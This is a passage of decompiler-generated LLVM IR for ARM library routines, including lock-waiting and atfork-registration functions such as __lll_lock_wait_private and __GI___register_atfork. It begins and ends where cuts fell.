  %v0_27d40 = phi i32 [ %v0_27d40.pre, %dec_label_pc_27d70.dec_label_pc_27d3c_crit_edge ], [ %v1_27d38, %bb76 ]
  %v0_27d3c = phi i32 [ %v0_27d3c.pre, %dec_label_pc_27d70.dec_label_pc_27d3c_crit_edge ], [ %v2_27d34, %bb76 ]
  %v1_27d3c = add i32 %v0_27d3c, 20
  %v2_27d3c = inttoptr i32 %v1_27d3c to i32*
  %v3_27d3c = load i32, i32* %v2_27d3c, align 4
  store i32 %v0_27d40, i32* %r2.global-to-local, align 4
  store i32 %v3_27d3c, i32* %r4.global-to-local, align 4
  %v1_27d48 = add i32 %v3_27d3c, -1
  store i32 %v1_27d48, i32* %r1.global-to-local, align 4
  %v1_27d4c87 = inttoptr i32 %v0_27d40 to i32*
  %v2_27d4c88 = load i32, i32* %v1_27d4c87, align 4
  store i32 %v2_27d4c88, i32* %r3.global-to-local, align 4
  %v3_27d5090 = icmp uge i32 %v2_27d4c88, %v3_27d3c
  store i1 %v3_27d5090, i1* %cpsr_c.global-to-local, align 1
  %v9_27d5096 = icmp eq i32 %v2_27d4c88, %v3_27d3c
  br i1 %v9_27d5096, label %dec_label_pc_27d58, label %dec_label_pc_27d70

dec_label_pc_27d58:                               ; preds = %dec_label_pc_27d3c, %dec_label_pc_27d58.dec_label_pc_27d4c_crit_edge
  %v0_27d5897 = phi i32 [ %v1_27d50.pre, %dec_label_pc_27d58.dec_label_pc_27d4c_crit_edge ], [ %v3_27d3c, %dec_label_pc_27d3c ]
  store i32 %v0_27d5897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_27d68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_27d68, label %dec_label_pc_27d6c, label %dec_label_pc_27d58.dec_label_pc_27d4c_crit_edge

dec_label_pc_27d58.dec_label_pc_27d4c_crit_edge:  ; preds = %dec_label_pc_27d58
  %v0_27d4c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_27d50.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_27d4c = inttoptr i32 %v0_27d4c.pre to i32*
  %v2_27d4c = load i32, i32* %v1_27d4c, align 4
  store i32 %v2_27d4c, i32* %r3.global-to-local, align 4
  %v3_27d50 = icmp uge i32 %v2_27d4c, %v1_27d50.pre
  store i1 %v3_27d50, i1* %cpsr_c.global-to-local, align 1
  %v9_27d50 = icmp eq i32 %v2_27d4c, %v1_27d50.pre
  br i1 %v9_27d50, label %dec_label_pc_27d58, label %dec_label_pc_27d70

dec_label_pc_27d6c:                               ; preds = %dec_label_pc_27d58
  %v0_27d6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_27d6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_27d70

dec_label_pc_27d70:                               ; preds = %dec_label_pc_27d3c, %dec_label_pc_27d58.dec_label_pc_27d4c_crit_edge, %dec_label_pc_27d6c
  %v0_27d7c = phi i32 [ %v0_27d6c, %dec_label_pc_27d6c ], [ %v2_27d4c88, %dec_label_pc_27d3c ], [ %v2_27d4c, %dec_label_pc_27d58.dec_label_pc_27d4c_crit_edge ]
  %v1_27d70 = phi i32 [ %v0_27d6c, %dec_label_pc_27d6c ], [ %v3_27d3c, %dec_label_pc_27d3c ], [ %v1_27d50.pre, %dec_label_pc_27d58.dec_label_pc_27d4c_crit_edge ]
  %v3_27d70 = icmp uge i32 %v0_27d7c, %v1_27d70
  store i1 %v3_27d70, i1* %cpsr_c.global-to-local, align 1
  %v9_27d70 = icmp eq i32 %v0_27d7c, %v1_27d70
  store i32 %v0_27d7c, i32* @r2, align 4
  br i1 %v9_27d70, label %dec_label_pc_27d7c, label %dec_label_pc_27d70.dec_label_pc_27d3c_crit_edge

dec_label_pc_27d70.dec_label_pc_27d3c_crit_edge:  ; preds = %dec_label_pc_27d70
  %v0_27d3c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_27d40.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_27d3c

dec_label_pc_27d7c:                               ; preds = %dec_label_pc_27d70
  %v2_27d7c = icmp ne i32 %v1_27d70, 0
  store i1 %v2_27d7c, i1* %cpsr_c.global-to-local, align 1
  %v7_27d7c = icmp eq i32 %v1_27d70, 1
  %v0_27d84 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_27d7c, label %dec_label_pc_27d84, label %dec_label_pc_27da8

dec_label_pc_27d84:                               ; preds = %dec_label_pc_27d7c
  %v1_27d84 = inttoptr i32 %v0_27d84 to i32*
  %v2_27d84 = load i32, i32* %v1_27d84, align 4
  store i32 %v2_27d84, i32* %r1.global-to-local, align 4
  %v1_27d88 = add i32 %v2_27d84, 24
  %v2_27d88 = inttoptr i32 %v1_27d88 to i32*
  %v3_27d88 = load i32, i32* %v2_27d88, align 4
  store i32 %v3_27d88, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27d8c = icmp eq i32 %v3_27d88, 0
  br i1 %v2_27d8c, label %dec_label_pc_27da8, label %dec_label_pc_27d94

dec_label_pc_27d94:                               ; preds = %dec_label_pc_27d84
  %v1_27d94 = add i32 %v2_27d84, 20
  %v2_27d94 = inttoptr i32 %v1_27d94 to i32*
  %v3_27d94 = load i32, i32* %v2_27d94, align 4
  store i32 %v3_27d94, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_27da8

dec_label_pc_27da8:                               ; preds = %dec_label_pc_27d7c, %dec_label_pc_27d94, %dec_label_pc_27d84
  %v1_27da8 = add i32 %v0_27d84, 4
  %v2_27da8 = inttoptr i32 %v1_27da8 to i32*
  %v3_27da8 = load i32, i32* %v2_27da8, align 4
  store i32 %v3_27da8, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27dac = icmp eq i32 %v3_27da8, 0
  br i1 %v2_27dac, label %dec_label_pc_27db4, label %dec_label_pc_27d20

dec_label_pc_27dacthread-pre-split:               ; preds = %dec_label_pc_27d04, %dec_label_pc_27cfc, %dec_label_pc_27c9c
  %v0_27dac.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27dac11 = icmp eq i32 %v0_27dac.pr, 0
  br i1 %v2_27dac11, label %dec_label_pc_27db4, label %dec_label_pc_27d20

dec_label_pc_27db4:                               ; preds = %dec_label_pc_27da8, %dec_label_pc_27dacthread-pre-split
  %v0_27db4.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_27db4.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_27db4.pre

; uselistorder directives
  uselistorder i32 %v0_27dac.pr, { 1, 0 }
  uselistorder i32 %v3_27da8, { 1, 2, 0 }
  uselistorder i32 %v1_27d70, { 1, 0, 2, 3 }
  uselistorder i32 %v0_27d6c, { 1, 0, 2 }
  uselistorder i32 %v1_27d50.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_27cf0, { 1, 0, 2 }
  uselistorder i32 %v1_27cd4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_27cc4, { 1, 0 }
  uselistorder i32 %v0_27b68, { 1, 0, 2 }
  uselistorder i32 %v1_27b4c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_27b24, { 2, 1, 0, 3 }
  uselistorder i32 %v0_27afc, { 1, 0, 2 }
  uselistorder i32 %v1_27ae0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_27aa8, { 1, 0, 2 }
  uselistorder i32 %v0_27a88, { 1, 0, 2 }
  uselistorder i32 %v1_27a6c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v3_27a4c, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 9, 8, 0, 10, 11, 12, 13, 15, 14, 1, 16, 17, 18, 19, 20, 21, 22, 24, 23, 2, 25, 26, 27, 29, 28, 3, 30, 31, 33, 32, 4, 34 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 13, 7, 8, 9, 11, 10, 2, 12, 14, 15, 17, 16, 3, 18, 19, 21, 20, 4, 22, 23, 25, 24, 5, 26, 27, 28, 30, 29, 6, 32, 31, 1 }
  uselistorder label %dec_label_pc_27db4, { 1, 0 }
  uselistorder label %dec_label_pc_27da8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_27d70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27d58, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_27cf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27cdc, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_27b6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27b54, { 1, 0 }
  uselistorder label %dec_label_pc_27b00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27ae8, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_27a8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27a74, { 1, 0 }
  uselistorder label %dec_label_pc_27b10.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_27a40, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_27dec = load i32, i32* @r4, align 4
  store i32 %v3_27dec, i32* %stack_var_-16, align 4
  %v0_27df0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_27df0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_27df4

dec_label_pc_27df4:                               ; preds = %dec_label_pc_27e74.dec_label_pc_27df4_crit_edge, %entry
  %v0_27df8 = phi i32 [ %v0_27df8.pre, %dec_label_pc_27e74.dec_label_pc_27df4_crit_edge ], [ %v0_27df0, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_27df8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_27e0017 = inttoptr i32 %v0_27df8 to i32*
  %v2_27e0018 = load i32, i32* %v1_27e0017, align 4
  %v3_27e0420 = icmp ne i32 %v2_27e0018, 0
  store i1 %v3_27e0420, i1* %cpsr_c.global-to-local, align 1
  %v9_27e0426 = icmp eq i32 %v2_27e0018, 1
  br i1 %v9_27e0426, label %dec_label_pc_27e0c, label %dec_label_pc_27e24

dec_label_pc_27e0c:                               ; preds = %dec_label_pc_27df4, %dec_label_pc_27e0c.dec_label_pc_27e00_crit_edge
  %v0_27e0c27 = phi i32 [ %v1_27e04.pre, %dec_label_pc_27e0c.dec_label_pc_27e00_crit_edge ], [ 1, %dec_label_pc_27df4 ]
  store i32 %v0_27e0c27, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_27e1c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_27e1c, label %dec_label_pc_27e20, label %dec_label_pc_27e0c.dec_label_pc_27e00_crit_edge

dec_label_pc_27e0c.dec_label_pc_27e00_crit_edge:  ; preds = %dec_label_pc_27e0c
  %v0_27e00.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_27e04.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_27e00 = inttoptr i32 %v0_27e00.pre to i32*
  %v2_27e00 = load i32, i32* %v1_27e00, align 4
  %v3_27e04 = icmp uge i32 %v2_27e00, %v1_27e04.pre
  store i1 %v3_27e04, i1* %cpsr_c.global-to-local, align 1
  %v9_27e04 = icmp eq i32 %v2_27e00, %v1_27e04.pre
  br i1 %v9_27e04, label %dec_label_pc_27e0c, label %dec_label_pc_27e24

dec_label_pc_27e20:                               ; preds = %dec_label_pc_27e0c
  %v0_27e20 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_27e24

dec_label_pc_27e24:                               ; preds = %dec_label_pc_27df4, %dec_label_pc_27e0c.dec_label_pc_27e00_crit_edge, %dec_label_pc_27e20
  %v0_27e24 = phi i32 [ %v0_27e20, %dec_label_pc_27e20 ], [ %v2_27e0018, %dec_label_pc_27df4 ], [ %v2_27e00, %dec_label_pc_27e0c.dec_label_pc_27e00_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27e24 = icmp eq i32 %v0_27e24, 0
  %v0_27e48.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_27e24, label %dec_label_pc_27e44, label %dec_label_pc_27e2c

dec_label_pc_27e2c:                               ; preds = %dec_label_pc_27e24
  store i32 %v0_27e48.pre, i32* %r0.global-to-local, align 4
  %v0_27e30 = load i32, i32* %r1.global-to-local, align 4
  %v1_27e30 = add i32 %v0_27e30, 126
  store i32 %v1_27e30, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27e44

dec_label_pc_27e44:                               ; preds = %dec_label_pc_27e24, %dec_label_pc_27e2c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_27e48.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_27e5028 = inttoptr i32 %v0_27e48.pre to i32*
  %v2_27e5029 = load i32, i32* %v1_27e5028, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_27e5436 = icmp eq i32 %v2_27e5029, 0
  br i1 %v9_27e5436, label %dec_label_pc_27e5c, label %dec_label_pc_27e74

dec_label_pc_27e5c:                               ; preds = %dec_label_pc_27e44, %dec_label_pc_27e5c.dec_label_pc_27e50_crit_edge
  %v0_27e5c37 = phi i32 [ %v1_27e54.pre, %dec_label_pc_27e5c.dec_label_pc_27e50_crit_edge ], [ 0, %dec_label_pc_27e44 ]
  store i32 %v0_27e5c37, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_27e6c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_27e6c, label %dec_label_pc_27e70, label %dec_label_pc_27e5c.dec_label_pc_27e50_crit_edge

dec_label_pc_27e5c.dec_label_pc_27e50_crit_edge:  ; preds = %dec_label_pc_27e5c
  %v0_27e50.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_27e54.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_27e50 = inttoptr i32 %v0_27e50.pre to i32*
  %v2_27e50 = load i32, i32* %v1_27e50, align 4
  %v3_27e54 = icmp uge i32 %v2_27e50, %v1_27e54.pre
  store i1 %v3_27e54, i1* %cpsr_c.global-to-local, align 1
  %v9_27e54 = icmp eq i32 %v2_27e50, %v1_27e54.pre
  br i1 %v9_27e54, label %dec_label_pc_27e5c, label %dec_label_pc_27e74

dec_label_pc_27e70:                               ; preds = %dec_label_pc_27e5c
  %v0_27e70 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_27e74

dec_label_pc_27e74:                               ; preds = %dec_label_pc_27e44, %dec_label_pc_27e5c.dec_label_pc_27e50_crit_edge, %dec_label_pc_27e70
  %v0_27e74 = phi i32 [ %v0_27e70, %dec_label_pc_27e70 ], [ %v2_27e5029, %dec_label_pc_27e44 ], [ %v2_27e50, %dec_label_pc_27e5c.dec_label_pc_27e50_crit_edge ]
  %v1_27e74 = phi i32 [ %v0_27e70, %dec_label_pc_27e70 ], [ 0, %dec_label_pc_27e44 ], [ %v1_27e54.pre, %dec_label_pc_27e5c.dec_label_pc_27e50_crit_edge ]
  %v3_27e74 = icmp uge i32 %v0_27e74, %v1_27e74
  store i1 %v3_27e74, i1* %cpsr_c.global-to-local, align 1
  %v9_27e74 = icmp eq i32 %v0_27e74, %v1_27e74
  br i1 %v9_27e74, label %dec_label_pc_27e7c, label %dec_label_pc_27e74.dec_label_pc_27df4_crit_edge

dec_label_pc_27e74.dec_label_pc_27df4_crit_edge:  ; preds = %dec_label_pc_27e74
  %v0_27df8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_27df4

dec_label_pc_27e7c:                               ; preds = %dec_label_pc_27e74
  %v2_27e7c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_27e7c, i32* %r4.global-to-local, align 4
  %v1_27e80 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_27e80

; uselistorder directives
  uselistorder i32 %v0_27e70, { 1, 0 }
  uselistorder i32 %v1_27e54.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_27e04.pre, { 2, 1, 0 }
  uselistorder i32 %v2_27e0018, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder label %dec_label_pc_27e74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27e5c, { 1, 0 }
  uselistorder label %dec_label_pc_27e44, { 1, 0 }
  uselistorder label %dec_label_pc_27e24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27e0c, { 1, 0 }
}

define i32 @__linkin_atfork(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_27e84 = load i32, i32* @r4, align 4
  store i32 %v3_27e84, i32* %stack_var_-24, align 4
  store i32 29848, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r5.global-to-local, align 4
  %v0_27e94 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_27e94, i32* %r6.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29848), i32* %r8.global-to-local, align 4
  br label %dec_label_pc_27e9c

dec_label_pc_27e9c:                               ; preds = %dec_label_pc_27ed0.dec_label_pc_27e9c_crit_edge, %entry
  %v0_27ea0 = phi i32 [ %v0_27ea0.pre, %dec_label_pc_27ed0.dec_label_pc_27e9c_crit_edge ], [ %v0_27e94, %entry ]
  %v1_27e9c = phi i32 [ %v1_27e9c.pre, %dec_label_pc_27ed0.dec_label_pc_27e9c_crit_edge ], [ 29848, %entry ]
  %v0_27e9c = phi i32 [ %v0_27e9c.pre, %dec_label_pc_27ed0.dec_label_pc_27e9c_crit_edge ], [ ptrtoint (i32* @global_var_428d0.3044 to i32), %entry ]
  %v2_27e9c = add i32 %v0_27e9c, %v1_27e9c
  %v3_27e9c = inttoptr i32 %v2_27e9c to i32*
  %v4_27e9c = load i32, i32* %v3_27e9c, align 4
  store i32 %v4_27e9c, i32* %r4.global-to-local, align 4
  %v2_27ea4 = inttoptr i32 %v0_27ea0 to i32*
  store i32 %v4_27e9c, i32* %v2_27ea4, align 4
  %v0_27ea8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_27ea8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27eac

dec_label_pc_27eac:                               ; preds = %dec_label_pc_27eb8.dec_label_pc_27eac_crit_edge, %dec_label_pc_27e9c
  %v0_27eac = phi i32 [ %v0_27eac.pre, %dec_label_pc_27eb8.dec_label_pc_27eac_crit_edge ], [ %v0_27ea8, %dec_label_pc_27e9c ]
  %v1_27eac = inttoptr i32 %v0_27eac to i32*
  %v2_27eac = load i32, i32* %v1_27eac, align 4
  %v1_27eb0 = load i32, i32* %r4.global-to-local, align 4
  %v3_27eb0 = icmp uge i32 %v2_27eac, %v1_27eb0
  store i1 %v3_27eb0, i1* %cpsr_c.global-to-local, align 1
  %v9_27eb0 = icmp eq i32 %v2_27eac, %v1_27eb0
  br i1 %v9_27eb0, label %dec_label_pc_27eb8, label %dec_label_pc_27ed0

dec_label_pc_27eb8:                               ; preds = %dec_label_pc_27eac
  store i32 %v2_27eac, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_27ec8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_27ec8, label %dec_label_pc_27ecc, label %dec_label_pc_27eb8.dec_label_pc_27eac_crit_edge

dec_label_pc_27eb8.dec_label_pc_27eac_crit_edge:  ; preds = %dec_label_pc_27eb8
  %v0_27eac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27eac

dec_label_pc_27ecc:                               ; preds = %dec_label_pc_27eb8
  %v0_27ecc = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_27ed0

dec_label_pc_27ed0:                               ; preds = %dec_label_pc_27eac, %dec_label_pc_27ecc
  %v0_27ed0 = phi i32 [ %v0_27ecc, %dec_label_pc_27ecc ], [ %v2_27eac, %dec_label_pc_27eac ]
  %v1_27ed0 = phi i32 [ %v0_27ecc, %dec_label_pc_27ecc ], [ %v1_27eb0, %dec_label_pc_27eac ]
  %v3_27ed0 = icmp uge i32 %v0_27ed0, %v1_27ed0
  store i1 %v3_27ed0, i1* %cpsr_c.global-to-local, align 1
  %v9_27ed0 = icmp eq i32 %v0_27ed0, %v1_27ed0
  br i1 %v9_27ed0, label %dec_label_pc_27ed8, label %dec_label_pc_27ed0.dec_label_pc_27e9c_crit_edge

dec_label_pc_27ed0.dec_label_pc_27e9c_crit_edge:  ; preds = %dec_label_pc_27ed0
  %v0_27e9c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_27e9c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_27ea0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_27e9c

dec_label_pc_27ed8:                               ; preds = %dec_label_pc_27ed0
  %v2_27ed8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_27ed8, i32* %r4.global-to-local, align 4
  %v1_27edc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_27edc

; uselistorder directives
  uselistorder i32 %v0_27ecc, { 1, 0 }
  uselistorder i32 %v1_27eb0, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29848), { 1, 0 }
  uselistorder i32 29848, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_27ed0, { 1, 0 }
}

define i32 @__GI___register_atfork(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_27ee8 = load i32, i32* @r4, align 4
  %v12_27ee8 = load i32, i32* @r7, align 4
  %v15_27ee8 = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 26052), i32* @r5, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @fp, align 4
  %v0_27f08 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_27f08, i32* @r8, align 4
  store i32 %arg4, i32* @sl, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 26052), i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_27f1c72 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 26052) to i32*), align 4
  store i32 %v2_27f1c72, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_27f2074 = icmp eq i32 %v2_27f1c72, 0
  br i1 %v9_27f2074, label %dec_label_pc_27f28, label %dec_label_pc_27f40

dec_label_pc_27f28:                               ; preds = %entry, %dec_label_pc_27f28.dec_label_pc_27f1c_crit_edge
  %v0_27f2875 = phi i32 [ %v1_27f20.pre, %dec_label_pc_27f28.dec_label_pc_27f1c_crit_edge ], [ 0, %entry ]
  store i32 %v0_27f2875, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_27f38 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_27f38, label %dec_label_pc_27f3c, label %dec_label_pc_27f28.dec_label_pc_27f1c_crit_edge

dec_label_pc_27f28.dec_label_pc_27f1c_crit_edge:  ; preds = %dec_label_pc_27f28
  %v0_27f1c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_27f20.pre = load i32, i32* @r4, align 4
  %v1_27f1c = inttoptr i32 %v0_27f1c.pre to i32*
  %v2_27f1c = load i32, i32* %v1_27f1c, align 4
  store i32 %v2_27f1c, i32* %r3.global-to-local, align 4
  %v3_27f20 = icmp uge i32 %v2_27f1c, %v1_27f20.pre
  store i1 %v3_27f20, i1* %cpsr_c.global-to-local, align 1
  %v9_27f20 = icmp eq i32 %v2_27f1c, %v1_27f20.pre
  br i1 %v9_27f20, label %dec_label_pc_27f28, label %dec_label_pc_27f40

dec_label_pc_27f3c:                               ; preds = %dec_label_pc_27f28
  %v0_27f3c = load i32, i32* @r4, align 4
  store i32 %v0_27f3c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_27f40

dec_label_pc_27f40:                               ; preds = %entry, %dec_label_pc_27f28.dec_label_pc_27f1c_crit_edge, %dec_label_pc_27f3c
  %v0_27f40 = phi i32 [ %v0_27f3c, %dec_label_pc_27f3c ], [ %v2_27f1c72, %entry ], [ %v2_27f1c, %dec_label_pc_27f28.dec_label_pc_27f1c_crit_edge ]
  %v1_27f40 = phi i32 [ %v0_27f3c, %dec_label_pc_27f3c ], [ 0, %entry ], [ %v1_27f20.pre, %dec_label_pc_27f28.dec_label_pc_27f1c_crit_edge ]
  %v3_27f40 = icmp uge i32 %v0_27f40, %v1_27f40
  store i1 %v3_27f40, i1* %cpsr_c.global-to-local, align 1
  %v9_27f40 = icmp eq i32 %v0_27f40, %v1_27f40
  br i1 %v9_27f40, label %bb48, label %bb

bb:                                               ; preds = %dec_label_pc_27f40
  %v1_27f44 = load i32, i32* @r5, align 4
  store i32 %v1_27f44, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_27f40, %bb
  store i32 163660, i32* @lr, align 4
  %v1_27f48 = xor i1 %v9_27f40, true
  call void @__pseudo_cond_branch(i1 %v1_27f48, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  store i32 26056, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v0_27f54 = load i32, i32* @r6, align 4
  %v2_27f54 = add i32 %v0_27f54, 26056
  %v0_27f58.pre = load i32, i32* @r4, align 4
  %tmp49 = icmp ult i32 %v0_27f58.pre, 48
  br label %dec_label_pc_27f58

dec_label_pc_27f58:                               ; preds = %dec_label_pc_27f7c, %bb48
  %v0_27f7c = phi i32 [ %v2_27f7c, %dec_label_pc_27f7c ], [ %v2_27f54, %bb48 ]
  store i32 %v0_27f58.pre, i32* %r2.global-to-local, align 4
  br i1 %tmp49, label %dec_label_pc_27f60, label %dec_label_pc_27f7c

dec_label_pc_27f60:                               ; preds = %dec_label_pc_27f58, %dec_label_pc_27f70
  %v0_27f70 = phi i32 [ %v1_27f70, %dec_label_pc_27f70 ], [ %v0_27f58.pre, %dec_label_pc_27f58 ]
  %v3_27f60 = mul i32 %v0_27f70, 28
  %v4_27f60 = add i32 %v3_27f60, %v0_27f7c
  store i32 %v4_27f60, i32* %r3.global-to-local, align 4
  %v1_27f64 = add i32 %v4_27f60, 24
  %v2_27f64 = inttoptr i32 %v1_27f64 to i32*
  %v3_27f64 = load i32, i32* %v2_27f64, align 4
  store i32 %v3_27f64, i32* %r3.global-to-local, align 4
  %v2_27f68 = icmp eq i32 %v3_27f64, 0
